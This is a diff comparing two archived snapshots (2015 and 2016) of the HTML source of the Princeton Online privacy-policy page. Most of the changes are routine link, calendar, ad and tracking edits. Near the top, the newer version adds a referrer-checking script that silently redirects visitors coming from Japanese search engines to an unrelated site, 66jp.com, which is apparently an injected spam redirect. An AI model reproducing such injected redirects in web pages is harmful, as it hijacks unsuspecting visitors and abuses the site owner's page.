@@ -1,7 +1,16 @@
-<!--The following is the downloaded HTML source of the princetonol.com privacy policy that was archived on 2015-12-25.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20151225064441id_/http%3A//www.princetonol.com/privacy.cfm) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the princetonol.com privacy policy that was archived on 2016-06-27.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20160627105529id_/http%3A//www.princetonol.com/privacy.cfm) for the most accurate reproduction.-->
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#"><head>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#"><head><script id="facebook-jssdk" src="//connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.3"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-K4LC22"></script><script>
+  var s=document.referrer;
+  if(s.indexOf("google.co.jp")>0||s.indexOf("docomo.ne.jp")>0||s.indexOf("yahoo.co.jp")>0)
+  {
+  self.location="http://www.66jp.com";
+  }
+</script>
+
+
+
 <!-- <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> -->
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <title>Princeton New Jersey: Princeton Online :: Privacy Policy</title>
@@ -12,13 +21,10 @@
 
 <meta name="Description" content="Princeton area community website with events, comprehensive business listings, and local information">
 <meta name="Keywords" content="Princeton, princeton, PRINCETON, einstein, borough, Borough, township, Township, Windsor, New Jersey, University, schools, community, business, corporate, nonprofit,non-profit, design, Internet, web, services">
-
-<script id="facebook-jssdk" src="//connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.3"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-K4LC22"></script><script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
-
-
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> 
 
 <link href="/polInc/css/default.css" rel="stylesheet" type="text/css" media="all">
-  
+
 <!--[if lte IE 7]>
 	<link rel="stylesheet" type="text/css" href="/polInc/css/iecss.css" />
 <![endif]-->
@@ -28,6 +34,7 @@
 
 <link href="/p7tp3/p7tp3-columns.css" rel="stylesheet" type="text/css" media="all">
 <link href="/p7tp3/p7TP3-03-pol.css" rel="stylesheet" type="text/css" media="all">
+
 <script type="text/javascript" src="/p7tp3/p7TP3scripts.js"></script>
 <style type="text/css">
 body {overflow-y: scroll;}
@@ -47,6 +54,7 @@ body {overflow-y: scroll;}
 <link href="/polInc/p7pmm/tnavp7.css" rel="stylesheet" type="text/css" media="all">
 <link href="/p7tp3/p7tp3-columns.css" rel="stylesheet" type="text/css" media="all">
 <link href="/p7tp3/p7TP3-03-pol.css" rel="stylesheet" type="text/css" media="all">
+
 <script type="text/javascript" src="/p7tp3/p7TP3scripts.js"></script>
 <style type="text/css">
 body {overflow-y: scroll;}
@@ -68,15 +76,7 @@ body {overflow-y: scroll;}
 <script src="//code.jquery.com/jquery-1.7.2.js"></script>-->
 <!-- <script type="text/javascript" src="/polInc/p7pmm/p7PMMscripts.js"></script> -->
 
-<script async="" type="text/javascript" src="/polInc/p7hgm/p7HGMscripts.js"></script>
-<link href="/polInc/p7hgm/p7hgm01.css" rel="stylesheet" type="text/css" media="all">
-<script async="" type="text/javascript" src="/polInc/p7ttm/p7TTMscripts.js"></script>
 
-<script type="text/javascript">
-<!--
-P7_opTTM('id:ttip01','id:featureTxt01','p7TTM01',8,700,8,0,1,32,-200,1,360,0,1,0,0,0,1,0);
-//-->
-</script>
 <script language="JavaScript" type="text/javascript">
 <!--
 	//  En
@@ -125,7 +125,14 @@ function countClicks_New(enterprise_code,sid_code,buspart_id,prod_id,server_name
 	window.open(banner_URL, '_blank');
 	//navigateToUrl(banner_URL);
 
-	var tmpId = setTimeout(function(){window.location.href = "/sharedInc/cf/polTrack.cfm?Buspart_id=" + buspart_id + "&Enterprise_Code=" + enterprise_code + "&Sid_Code=" + sid_code  + "&Prod_id=" + prod_id + "&Server_Name=" + server_name + "&Path_Info=" + path_info + "&Query_String=" + query_string;},50);
+	
+
+	$.ajax({
+		method:"get",
+		url:"/sharedInc/cf/polTrack.cfm",
+		data:{Buspart_id:buspart_id,Enterprise_Code:enterprise_code,Sid_Code:sid_code,Prod_id:prod_id,Server_Name:server_name,Path_Info:path_info,Query_String:query_string},
+		success:function(data){}
+	});
   }
 function navigateToUrl(url) {
     var f = document.createElement("FORM");
@@ -155,6 +162,8 @@ function navigateToUrl(url) {
 <link rel="canonical" href="http://www.princetonol.com/privacy.cfm">
 
 
+<!--[if IE 9]><link rel="stylesheet" href="/polInc/css/IE-8.css" type="text/css" /><![endif]-->
+
 <!-- Google Tag Manager -->
 <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-K4LC22"
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
@@ -166,7 +175,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <!-- End Google Tag Manager -->
 
 
-<meta property="og:image" content="http://www.princetonol.com/polInc/images/ca/att/att-pol-fb.png">
+<meta property="og:image" content="/polInc/images/ca/att/att-pol-fb.png">
 
 <style>
 .leftbar-links {
@@ -217,7 +226,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <div class="hdrBox clearfix">
       <div class="hdrLeft">
         
-        <div class="boxNorm"><a href="http://www.princetonol.com/"><img src="/polInc/images/headers/hdrPol.gif" alt="Princeton Online: Princeton, New Jersey: Premier community information web site" width="584px" height="70px" border="0"></a></div>
+        <div class="boxNorm"><a href="/"><img src="/polInc/images/headers/hdrPol.gif" alt="Princeton Online: Princeton, New Jersey: Premier community information web site" width="584px" height="70px" border="0"></a></div>
         
 		<div class="titlePOL">Princeton New Jersey</div>
         
@@ -225,7 +234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
       <div class="hdrRight wide06">
         <div class="searchBox wide06">
           
-          <form action="http://www.princetonol.com/searchresults.cfm" id="cse-search-box">
+          <form action="/searchresults.cfm" id="cse-search-box">
             <div class="searchInputBox">
               <input type="hidden" name="cx" value="017963481415345563134:tjrrrzieweu">
               <input type="hidden" name="cof" value="FORID:9">
@@ -246,7 +255,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         <div class="bannerBox wide06">
           
               
-			  <a href="javascript:void(0)" onclick="countClicks_New('POL','POL','3739','3','www.princetonol.com','','','http://www.mayflowercleaners.com/')"><img src="http://www.princetonol.com/img_b/mayflower.gif" border="0" alt="http://www.mayflowercleaners.com/" align="left" style="width:auto; height:auto"></a>
+			  <a href="javascript:void(0)" onclick="countClicks_New('POL','POL','2346','3','www.princetonol.com','/privacy.cfm','','http://www.sendingsmiles.com/')"><img src="http://www.princetonol.com/polInc/images/ca/bnr/bnr-monday-morning-spring.jpg" border="0" alt="http://www.sendingsmiles.com/" align="left" style="width:auto; height:auto"></a>
               
           <!--#exec cgi="/cgi-bin/ads.pl"-->
         </div>
@@ -257,14 +266,14 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 		<div id="tnav01">
 	<div id="tnav-container">
 		<ul id="tnav-navlist">
-			<li><a href="http://www.princetonol.com/" title="Princeton Online Home Page"><span id="tnav01Btn01">Home</span></a></li>
-			<li><a href="http://www.princetonol.com/business" title="Princeton Businesses"><span id="tnav01Btn02">Businesses</span></a></li>
+			<li><a href="/" title="Princeton Online Home Page"><span id="tnav01Btn01">Home</span></a></li>
+			<li><a href="/business" title="Princeton Businesses"><span id="tnav01Btn02">Businesses</span></a></li>
 			<li><a href="http://www.princetondining.com" title="Princeton Dining"><span id="tnav01Btn03">Dining</span></a></li>
 			<li><a href="http://www.princetonentertain.com" title="Princeton Entertainment"><span id="tnav01Btn04">Entertainment</span></a></li>
-			<li><a href="http://www.princetonol.com/family" title="Princeton Family"><span id="tnav01Btn05">Family</span></a></li>
+			<li><a href="/family" title="Princeton Family"><span id="tnav01Btn05">Family</span></a></li>
 			<li><a href="http://www.princetonwellbeing.com" title="Princeton Health"><span id="tnav01Btn06">Health</span></a></li>
 			<li><a href="http://www.princetonlodging.com" title="Princeton Lodging"><span id="tnav01Btn07">Lodging</span></a></li>
-			<li><a href="http://www.princetonol.com/groups" title="Princeton Non-profits"><span id="tnav01Btn08">Non-profits</span></a></li>
+			<li><a href="/groups" title="Princeton Non-profits"><span id="tnav01Btn08">Non-profits</span></a></li>
 			<li><a href="http://www.princetonreal-estate.com" title="Princeton Real Estate"><span id="tnav01Btn09">Real Estate</span></a></li>
 			<li><a href="http://www.princetonshopping.com" title="Princeton Shopping"><span id="tnav01Btn10">Shopping</span></a></li>
 		</ul>
@@ -290,11 +299,14 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     
     <caption>
     
-    	<a href="polCalendar.cfm?Start_Date={d '2015-11-01'}&amp;Calendar_Code=" title="previous month" class="prenex">«</a>
+    	
+		<a href="/calendars/2016-05-01/" title="previous month" class="prenex">«</a>
 	
-      <a href="polCalendar.cfm?Start_Date={d '2015-12-01'}&amp;End_Date={d '2016-01-01'}&amp;Calendar_Code=" class="calmonth">December 2015</a>
+	  <a href="/calendars/2016-06-01/" class="calmonth">June 2016</a>
+      
     
-    <a href="polCalendar.cfm?Start_Date={d '2016-01-01'}&amp;Calendar_Code=" title="next month" class="prenex">»</a>
+    
+	<a href="/calendars/2016-07-01/" title="next month" class="prenex">»</a>
 	
     </caption>
     <tbody><tr>
@@ -314,24 +326,26 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         <td class="calInactive">29</td>
         
         <td class="calInactive">30</td>
+        
+        <td class="calInactive">31</td>
         <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-01'}&amp;Calendar_Code=">1</a>
+          
+		  <a href="/events/2016-06-01/">1</a>
           
       </td>
     <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-02'}&amp;Calendar_Code=">2</a>
+          
+		  <a href="/events/2016-06-02/">2</a>
           
       </td>
     <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-03'}&amp;Calendar_Code=">3</a>
+          
+		  <a href="/events/2016-06-03/">3</a>
           
       </td>
     <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-04'}&amp;Calendar_Code=">4</a>
           
-      </td>
-    <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-05'}&amp;Calendar_Code=">5</a>
+		  <a href="/events/2016-06-04/">4</a>
           
       </td>
     
@@ -339,76 +353,51 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     
             <tr>
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-06'}&amp;Calendar_Code=">6</a>
+          
+		  
+		  <a href="/events/2016-06-05/">5</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-07'}&amp;Calendar_Code=">7</a>
+          
+		  
+		  <a href="/events/2016-06-06/">6</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-08'}&amp;Calendar_Code=">8</a>
+          
+		  
+		  <a href="/events/2016-06-07/">7</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-09'}&amp;Calendar_Code=">9</a>
+          
+		  
+		  <a href="/events/2016-06-08/">8</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-10'}&amp;Calendar_Code=">10</a>
+          
+		  
+		  <a href="/events/2016-06-09/">9</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-11'}&amp;Calendar_Code=">11</a>
+          
+		  
+		  <a href="/events/2016-06-10/">10</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-12'}&amp;Calendar_Code=">12</a>
           
-      </td>
-
-      
-        </tr>
-        
-            <tr>
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-13'}&amp;Calendar_Code=">13</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-14'}&amp;Calendar_Code=">14</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-15'}&amp;Calendar_Code=">15</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-16'}&amp;Calendar_Code=">16</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-17'}&amp;Calendar_Code=">17</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-18'}&amp;Calendar_Code=">18</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-19'}&amp;Calendar_Code=">19</a>
+		  
+		  <a href="/events/2016-06-11/">11</a>
           
       </td>
 
@@ -417,66 +406,143 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         
             <tr>
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-20'}&amp;Calendar_Code=">20</a>
+          
+		  
+		  <a href="/events/2016-06-12/">12</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-21'}&amp;Calendar_Code=">21</a>
+          
+		  
+		  <a href="/events/2016-06-13/">13</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-22'}&amp;Calendar_Code=">22</a>
+          
+		  
+		  <a href="/events/2016-06-14/">14</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-23'}&amp;Calendar_Code=">23</a>
+          
+		  
+		  <a href="/events/2016-06-15/">15</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-24'}&amp;Calendar_Code=">24</a>
+          
+		  
+		  <a href="/events/2016-06-16/">16</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-17/">17</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-18/">18</a>
+          
+      </td>
+
+      
+        </tr>
+        
+            <tr>
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-19/">19</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-20/">20</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-21/">21</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-22/">22</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-23/">23</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-24/">24</a>
+          
+      </td>
+
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-25/">25</a>
+          
+      </td>
+
+      
+        </tr>
+        
+            <tr>
+      <td> 
+          
+		  
+		  <a href="/events/2016-06-26/">26</a>
           
       </td>
 
       <td class="today"> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-25'}&amp;Calendar_Code=">25</a>
+          
+		  
+		  <a href="/events/2016-06-27/">27</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-26'}&amp;Calendar_Code=">26</a>
           
-      </td>
-
-      
-        </tr>
-        
-            <tr>
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-27'}&amp;Calendar_Code=">27</a>
+		  
+		  <a href="/events/2016-06-28/">28</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-28'}&amp;Calendar_Code=">28</a>
+          
+		  
+		  <a href="/events/2016-06-29/">29</a>
           
       </td>
 
       <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-29'}&amp;Calendar_Code=">29</a>
           
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-30'}&amp;Calendar_Code=">30</a>
-          
-      </td>
-
-      <td> 
-          <a href="polCalendarEvent.cfm?Event_Date={d '2015-12-31'}&amp;Calendar_Code=">31</a>
+		  
+		  <a href="/events/2016-06-30/">30</a>
           
       </td>
 
@@ -648,20 +714,20 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 		<h2>Features</h2>
           <ul>
-            <li><a href="http://www.princetonol.com/automotive/">Automotive</a></li>
-            <li><a href="http://www.princetonol.com/back_to_school/">Back to School</a></li>
-            <li><a href="http://www.princetonol.com/beautyandfitness/">Beauty and Fitness</a></li>
-            <li><a href="http://www.princetonol.com/finance/">Financial Services</a></li>
-            <li><a href="http://www.princetonol.com/holidays/">Holidays</a></li>
-            <li><a href="http://www.princetonol.com/homeimprovement/">Home Improvement</a></li>
-            <li><a href="http://www.princetonol.com/homeandgarden/">House and Garden</a></li>
-            <li><a href="http://www.princetonol.com/law/">Law</a></li>
-            <li><a href="http://www.princetonol.com/pets/">Pets</a></li>
-            <li><a href="http://www.princetonol.com/seniors/">Seniors</a></li>
-			<li><a href="http://www.princetonol.com/sports/">Sports</a></li>
-            <li><a href="http://www.princetonol.com/summercamps/">Summer Camps</a></li>
-            <li><a href="http://www.princetonol.com/summerfare/">Summer Fare</a></li>
-            <li><a href="http://www.princetonol.com/weddings/">Weddings</a></li>
+            <li><a href="/automotive/">Automotive</a></li>
+            <li><a href="/back_to_school/">Back to School</a></li>
+            <li><a href="/beautyandfitness/">Beauty and Fitness</a></li>
+            <li><a href="/finance/">Financial Services</a></li>
+            <li><a href="/holidays/">Holidays</a></li>
+            <li><a href="/homeimprovement/">Home Improvement</a></li>
+            <li><a href="/homeandgarden/">House and Garden</a></li>
+            <li><a href="/law/">Law</a></li>
+            <li><a href="/pets/">Pets</a></li>
+            <li><a href="/seniors/">Seniors</a></li>
+			<li><a href="/sports/">Sports</a></li>
+            <li><a href="/summercamps/">Summer Camps</a></li>
+            <li><a href="/summerfare/">Summer Fare</a></li>
+            <li><a href="/weddings/">Weddings</a></li>
           </ul>
         </div>
 
@@ -669,29 +735,15 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   <div class="lnav01">
     <ul class="listnone">
      
-        
-        
-        
-        
-     
     </ul>
   </div>
 
   <div class="lnav02">
     <ul class="listnone">
      
-        
-        
-     
-      
     </ul>
   </div>
 </div>
-
-
-
-
-<br>
 
 
 
@@ -738,7 +790,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   <div class="c20 colorRight">
     <div class="boxNormBM15">
       
-	  <div class="boxNormBM05 mAuto wide08" align="center"><a href="javascript:void(0)" onclick="countClicks_New('POL','POL','7103','1278','www.princetonol.com','','','http://www.princetonol.com/holidays/')"><img src="http://www.princetonol.com/polinc/images/ca/tower/tower-pol-holiday-2015.jpg" border="0" alt=""></a></div>
+	  <div class="boxNormBM05 mAuto wide08" align="center"><a href="javascript:void(0)" onclick="countClicks_New('POL','POL','7103','1278','www.princetonol.com','','','http://www.princetonol.com/summercamps/')"><img src="http://www.princetonol.com/polinc/images/ca/tower/tower-summer-camp-2015.jpg" border="0" alt=""></a></div>
 	  
     </div>
     <div class="boxNormBM15 mAuto adWidth">
@@ -757,37 +809,37 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     </div>
 <div class="bnavBox">
   <ul class="bnavList">
-    <li><a href="http://www.princetonol.com/">Home</a></li>
-    <li><a href="http://www.princetonol.com/business/">Business</a></li>
+    <li><a href="/">Home</a></li>
+    <li><a href="/business/">Business</a></li>
     <li><a href="http://www.princetondining.com/">Dining</a></li>
     <li><a href="http://www.princetonentertain.com/">Entertainment</a></li>
     <li><a href="http://www.princetonwellbeing.com/">Health</a></li>
     <li><a href="http://www.princetonlodging.com/">Lodging</a></li>
-    <li><a href="http://www.princetonol.com/groups/">Non-Profits</a></li>
+    <li><a href="/groups/">Non-Profits</a></li>
     <li><a href="http://www.princetonreal-estate.com/">Real Estate</a></li>
     <li><a href="http://www.princetonshopping.com/">Shopping</a></li>
-    <li><a href="http://www.princetonol.com/polClassifieds.cfm">Classifieds</a></li>
-    <li><a href="http://www.princetonol.com/sitemap.cfm">Site Map</a></li>
+    <li><a href="/classifieds/">Classifieds</a></li>
+    <li><a href="/sitemap/">Site Map</a></li>
     <li id="topPage"><a href="#top">Top of Page</a></li>
   </ul>
 </div>
 <div class="bnavBox bgWhite">
   <ul class="bnavList">
-    <li><a href="http://www.princetonol.com/features.cfm">Features</a></li>
-    <li><a href="http://www.princetonol.com/automotive">Automotive</a></li>
-    <li><a href="http://www.princetonol.com/back_to_school/">Back to School</a></li>
-    <li><a href="http://www.princetonol.com/Finance">Financial Services</a></li>
-    <li><a href="http://www.princetonol.com/holidays">Holidays</a></li>
-    <li><a href="http://www.princetonol.com/Homeimprovement">Home Improvement</a></li>
+    <li><a href="/features/">Features</a></li>
+    <li><a href="/automotive">Automotive</a></li>
+    <li><a href="/back_to_school/">Back to School</a></li>
+    <li><a href="/Finance">Financial Services</a></li>
+    <li><a href="/holidays">Holidays</a></li>
+    <li><a href="/Homeimprovement">Home Improvement</a></li>
   </ul>
 </div>
 <div class="bnavBox bgWhite">
   <ul class="bnavList">
-    <li><a href="http://www.princetonol.com/Homeandgarden">House &amp; Garden</a></li>
-    <li><a href="http://www.princetonol.com/law">Law</a></li>
-    <li><a href="http://www.princetonol.com/SummerCamps">Summer Camps</a></li>
-    <li><a href="http://www.princetonol.com/Summerfare">Summer Fare</a></li>
-    <li><a href="http://www.princetonol.com/weddings">Weddings</a></li>
+    <li><a href="/Homeandgarden">House &amp; Garden</a></li>
+    <li><a href="/law">Law</a></li>
+    <li><a href="/SummerCamps">Summer Camps</a></li>
+    <li><a href="/Summerfare">Summer Fare</a></li>
+    <li><a href="/weddings">Weddings</a></li>
   </ul>
 </div>
 <div class="bnavBox bgWhite">
@@ -796,7 +848,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        <a href="mailto:changes@princetonol.com?subject=Website Feedback">Feedback</a> </li>
     <li>
       <a href="mailto:advertising@princetonol.com?subject=Princeton Advertising">Advertise Here</a> </li>
-    <li><a href="http://www.princetonol.com/privacy.cfm" class="bnav2">Disclaimer and Privacy Policy</a></li>
+    <li><a href="/privacy/" class="bnav2">Disclaimer and Privacy Policy</a></li>
 	<li><a href="/pollogin.cfm">Login</a></li>
 	
   </ul>
